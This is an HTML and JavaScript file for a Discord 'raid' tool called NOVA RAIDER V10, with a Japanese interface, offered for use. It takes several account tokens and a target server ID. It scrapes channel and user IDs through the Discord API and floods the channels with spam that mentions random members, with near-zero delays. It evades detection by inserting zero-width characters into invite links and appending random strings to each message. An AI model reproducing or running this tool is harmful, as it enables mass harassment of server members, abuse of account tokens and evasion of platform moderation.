<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>NOVA RAIDER</title>
    <style>
        :root {
            --bg: #040406;
            --accent: #00d4ff;
            --danger: #ff0055;
            --card: #0d0d16;
            --border: #1a1a2e;
            --input-bg: #000;
            --text: #d1d1d6;
            --text-main: #fff;
            --btn-text: #000;
        }

        .light-mode {
            --bg: #f4f7f9;
            --accent: #ff6600;
            --danger: #d10044;
            --card: #ffffff;
            --border: #dcdfe3;
            --input-bg: #fdfdfd;
            --text: #4a4a4a;
            --text-main: #000;
            --btn-text: #fff;
        }

        body {
            font-family: 'Consolas', 'Meiryo', sans-serif;
            background-color: var(--bg); color: var(--text);
            margin: 0; padding: 20px; display: flex; justify-content: center;
            transition: background 0.3s, color 0.3s;
        }

        .container {
            width: 100%; max-width: 850px; background: var(--card); padding: 25px;
            border-radius: 8px; border: 1px solid var(--border);
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.1);
        }

        .title-area { text-align: center; margin-bottom: 20px; border-bottom: 2px solid var(--accent); padding-bottom: 10px; }
        .title { font-size: 24px; font-weight: 900; letter-spacing: 8px; color: var(--accent); margin: 0; }

        label { display: block; font-size: 11px; color: var(--accent); margin-bottom: 5px; font-weight: bold; }

        textarea, input, select {
            width: 100%; padding: 10px; background: var(--input-bg); border: 1px solid var(--border);
            border-radius: 4px; color: var(--text-main); box-sizing: border-box; font-size: 12px; outline: none;
        }

        .flex-row { display: flex; gap: 10px; margin-bottom: 12px; }
        .flex-1 { flex: 1; }

        .btn { padding: 10px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 12px; }
        .btn-main { background: var(--accent); color: var(--btn-text); width: 100%; font-size: 14px; padding: 15px; }
        .btn-active { background: var(--danger) !important; color: #fff !important; animation: pulse 1s infinite; }
        .btn-stop { background: #666; color: #fff; width: 100px; }
        
        .btn-sub { background: var(--accent); color: var(--btn-text); font-size: 10px; height: 32px; padding: 0 10px; }
        .btn-copy-special { background: #28a745; color: white; font-size: 10px; height: 32px; padding: 0 10px; }

        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }

        .config-grid { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 10px; margin-bottom: 15px; }

        /* 検知回避エリアを小さく */
        .bypass-section {
            background: rgba(128, 128, 128, 0.05); border: 1px solid var(--border);
            padding: 10px; border-radius: 4px; margin-bottom: 15px;
        }
        .bypass-inner { display: flex; align-items: center; gap: 8px; }

        .status-bar {
            display: flex; justify-content: space-between; background: var(--input-bg); padding: 12px;
            border-radius: 4px; margin-bottom: 15px; border: 1px solid var(--border); font-size: 13px;
        }
        .status-val { color: var(--accent); font-weight: bold; }

        #log { margin-top: 15px; height: 100px; background: var(--input-bg); border: 1px solid var(--border); padding: 10px; font-size: 11px; overflow-y: auto; color: #666; }
        
        .theme-toggle {
            position: fixed; bottom: 20px; left: 20px;
            background: var(--accent); color: var(--btn-text); border: none;
            padding: 10px 15px; border-radius: 50px; font-weight: bold;
            cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            font-size: 12px; z-index: 1000; transition: 0.2s;
        }

        .toggle-container { display: flex; align-items: center; gap: 10px; background: var(--input-bg); padding: 6px 10px; border-radius: 4px; border: 1px solid var(--border); }
        .switch { position: relative; display: inline-block; width: 30px; height: 16px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 20px; }
        .slider:before { position: absolute; content: ""; height: 10px; width: 10px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
        input:checked + .slider { background-color: var(--accent); }
        input:checked + .slider:before { transform: translateX(14px); }
    </style>
</head>
<body>

<button class="theme-toggle" onclick="toggleTheme()" id="themeBtn">ライトモードへ</button>

<div class="container">
    <div class="title-area">
        <h1 class="title">NOVA RAIDER V10</h1>
    </div>

    <div class="bypass-section">
        <label style="font-size: 10px; opacity: 0.8;">招待リンク検知回避</label>
        <div class="bypass-inner">
            <input type="text" id="inviteInput" style="height: 32px; font-size: 11px;" placeholder="discord.gg/リンクを入力">
            <button class="btn btn-sub" onclick="bypassInvite()">変換</button>
            <div id="bypassResultContainer" style="display:none; flex: 1; display: none; align-items: center; gap: 5px;">
                <input type="text" id="bypassedOutput" readonly style="height: 32px; font-size: 11px; border-color: #28a745;">
                <button class="btn btn-copy-special" onclick="copyBypassed()">コピー</button>
            </div>
        </div>
    </div>

    <div class="flex-row">
        <div class="flex-1">
            <label>使用トークン (1行1枚)</label>
            <textarea id="tokens" style="height: 45px;" placeholder="トークンを入力..."></textarea>
        </div>
        <div style="width: 200px;">
            <label>ターゲットサーバーID</label>
            <input type="text" id="guildId">
            <button class="btn" style="background:var(--input-bg); color:var(--accent); font-size:10px; margin-top:5px; padding:5px; width:100%; border:1px solid var(--border);" onclick="fetchServerInfo()">サーバー情報を取得</button>
        </div>
    </div>

    <div class="config-grid">
        <div><label>送信間隔 (秒)</label><input type="number" id="delayNum" value="0" step="0.01" min="0"></div>
        <div><label>取得メッセージ/送信数</label><input type="number" id="limit" value="15"></div>
        <div><label>ランダム文字列数</label><input type="number" id="randLen" value="15" min="0"></div>
        <div>
            <label>回避言語</label>
            <select id="lang">
                <option value="en">英語</option><option value="en_num">英数字</option>
                <option value="jp_kana">日本語</option><option value="km" selected>クメール</option>
            </select>
        </div>
    </div>

    <div class="flex-row">
        <textarea class="flex-1" id="channels" style="height: 60px;" placeholder="チャンネルIDリスト"></textarea>
        <textarea class="flex-1" id="members" style="height: 60px;" placeholder="アクティブユーザーリスト"></textarea>
    </div>

    <div style="margin-bottom: 15px;">
        <label>送信メッセージ内容</label>
        <textarea id="msgBody" style="height: 100px; font-size: 14px;" placeholder="ここにメッセージを入力..."></textarea>
    </div>

    <div class="flex-row" style="align-items: center;">
        <div class="toggle-container">
            <span style="font-size: 11px; color: var(--accent);">メンション</span>
            <label class="switch"><input type="checkbox" id="mentionToggle" checked><span class="slider"></span></label>
        </div>
        <div class="flex-1">
            <select id="modeSelect" onchange="setMode(this.value)">
                <option value="normal">通常raid</option>
                <option value="reply">リプライraid</option>
            </select>
        </div>
    </div>

    <div class="status-bar">
        <div>MODE: <span id="currentModeDisplay" class="status-val">NORMAL</span></div>
        <div>SENT: <span id="sentCount" class="status-val">0</span></div>
        <div>STATUS: <span id="statusText" class="status-val">READY</span></div>
    </div>

    <div class="flex-row">
        <button id="start" class="btn btn-main flex-1" onclick="execute()">スパムを開始</button>
        <button id="stop" class="btn btn-stop" onclick="stop()" disabled>停止</button>
    </div>

    <div id="log"></div>
</div>

<script>
    let sweeping = false;
    let attackMode = 'normal';
    let sentCount = 0;

    const charSets = {
        en: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        en_num: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        jp_kana: "あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん",
        km: "កខគឃងចឆជឈញដឋឌឍណតថទធនបផពភមយរលវសហឡអ"
    };

    function toggleTheme() {
        const body = document.body;
        const btn = document.getElementById('themeBtn');
        body.classList.toggle('light-mode');
        if(body.classList.contains('light-mode')) {
            btn.innerText = "ダークモードへ";
            btn.style.background = "#333";
            btn.style.color = "#fff";
        } else {
            btn.innerText = "ライトモードへ";
            btn.style.background = "var(--accent)";
            btn.style.color = "var(--btn-text)";
        }
    }

    function bypassInvite() {
        const input = document.getElementById('inviteInput');
        const url = input.value.trim();
        if (!url.includes("discord.gg/") && !url.includes("discord.com/invite/")) {
            alert("エラー: Discord招待リンクを入力してください。");
            return;
        }
        const bypassed = url.split("").join("\u200B");
        const resCont = document.getElementById('bypassResultContainer');
        resCont.style.display = 'flex';
        document.getElementById('bypassedOutput').value = bypassed;
        document.getElementById('msgBody').value = bypassed;
        log("検知回避リンクを作成しました。");
    }

    function copyBypassed() {
        const copyText = document.getElementById("bypassedOutput");
        copyText.select();
        document.execCommand("copy");
        alert("コピー完了！");
    }

    function log(m) {
        const l = document.getElementById('log');
        const d = document.createElement('div');
        d.innerHTML = `[${new Date().toLocaleTimeString()}] ${m}`;
        l.prepend(d);
    }

    function setMode(mode) {
        attackMode = mode;
        document.getElementById('currentModeDisplay').innerText = mode.toUpperCase();
    }

    async function fetchServerInfo() {
        const t = document.getElementById('tokens').value.split('\n')[0].trim();
        const g = document.getElementById('guildId').value.trim();
        if(!t || !g) return alert("トークンとサーバーIDが必要です");
        try {
            log("情報取得中...");
            const rC = await fetch(`https://discord.com/api/v9/guilds/${g}/channels`, { headers: { 'Authorization': t } });
            const channels = await rC.json();
            const textChannels = channels.filter(c => [0,5].includes(c.type));
            document.getElementById('channels').value = textChannels.map(c => c.id).join('\n');
            let userSet = new Set();
            for(const ch of textChannels.slice(0, 3)) {
                const rM = await fetch(`https://discord.com/api/v9/channels/${ch.id}/messages?limit=50`, { headers: { 'Authorization': t } });
                const msgs = await rM.json();
                if(Array.isArray(msgs)) msgs.forEach(m => userSet.add(m.author.id));
            }
            document.getElementById('members').value = Array.from(userSet).join('\n');
            log("同期完了。");
        } catch(e) { log("取得失敗。"); }
    }

    function getRand() {
        const len = parseInt(document.getElementById('randLen').value);
        if (len <= 0) return "";
        const s = charSets[document.getElementById('lang').value];
        let r = "\n# ";
        for(let i=0; i<len; i++) r += s.charAt(Math.floor(Math.random()*s.length));
        return r;
    }

    async function execute() {
        const tokens = document.getElementById('tokens').value.split('\n').filter(x => x.trim());
        if (tokens.length === 0) return alert("トークンを入力してください！");
        const msg = document.getElementById('msgBody').value.trim();
        const startBtn = document.getElementById('start');
        sweeping = true;
        startBtn.disabled = true;
        startBtn.innerText = "ATTACKING...";
        startBtn.classList.add('btn-active');
        document.getElementById('stop').disabled = false;
        document.getElementById('statusText').innerText = "RUNNING";
        const channels = document.getElementById('channels').value.split('\n').filter(x => x.trim());
        const members = document.getElementById('members').value.split('\n').filter(x => x.trim());
        const limit = parseInt(document.getElementById('limit').value);
        const isMention = document.getElementById('mentionToggle').checked;
        const delayMs = parseFloat(document.getElementById('delayNum').value) * 1000;
        for (const chId of channels) {
            if (!sweeping) break;
            for (let i = 0; i < limit; i++) {
                if (!sweeping) break;
                let replyId = null;
                if (attackMode === 'reply' && i === 0) {
                   try {
                       const res = await fetch(`https://discord.com/api/v9/channels/${chId}/messages?limit=1`, { headers: { 'Authorization': tokens[0] } });
                       const lastMsg = await res.json();
                       if(lastMsg[0]) replyId = lastMsg[0].id;
                   } catch(e){}
                }
                sendMsg(tokens, chId, replyId, members, msg, isMention);
                await new Promise(r => setTimeout(r, delayMs || 10));
            }
        }
        if (sweeping) stop();
    }

    async function sendMsg(tokens, chId, replyId, members, msg, isMention) {
        const token = tokens[Math.floor(Math.random() * tokens.length)];
        let content = (isMention && members.length > 0) ? `<@${members[Math.floor(Math.random() * members.length)]}> ${msg}` : msg;
        content += getRand();
        fetch(`https://discord.com/api/v9/channels/${chId}/messages`, {
            method: 'POST',
            headers: { 'Authorization': token, 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: content, message_reference: replyId ? { message_id: replyId } : undefined })
        }).then(res => { if(res.ok) { sentCount++; document.getElementById('sentCount').innerText = sentCount; } });
    }

    function stop() {
        sweeping = false;
        const startBtn = document.getElementById('start');
        startBtn.disabled = false;
        startBtn.innerText = "スパムを開始";
        startBtn.classList.remove('btn-active');
        document.getElementById('stop').disabled = true;
        document.getElementById('statusText').innerText = "STOPPED";
    }
</script>
</body>
</html>
